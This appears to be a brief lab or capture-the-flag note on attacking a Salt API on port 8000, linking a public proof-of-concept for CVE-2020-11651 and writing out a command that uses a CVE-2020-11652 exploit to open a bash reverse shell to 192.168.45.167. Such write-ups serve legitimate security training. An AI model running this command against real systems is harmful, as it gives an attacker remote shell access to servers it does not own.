
# 8000
![](attachment/4beb0266e0bbba75da736cc5858a2d11.png)
Information disclosure

![](attachment/5ed7eda06a54b277cc9777f9be78f5b5.png)
Now checking google for this json:
![](attachment/bec04212ee3f947b5663fda511fdb188.png)

It's the salt API

Using this exploit:
https://github.com/jasperla/CVE-2020-11651-poc
![](attachment/dcbcf6119e19ba58b4339b5b61c0f39b.png)


Now we can get the shell:
```bash
python3 CVE-2020-11652/CVE-2020-11652.py --master 192.168.234.62 --exec-choose master --exec-cmd "/bin/bash -i >& /dev/tcp/192.168.45.167/80 0>&1"
```
We get a shell back:
![](attachment/ac5db882233061d4ab78619c920c6b3e.png)

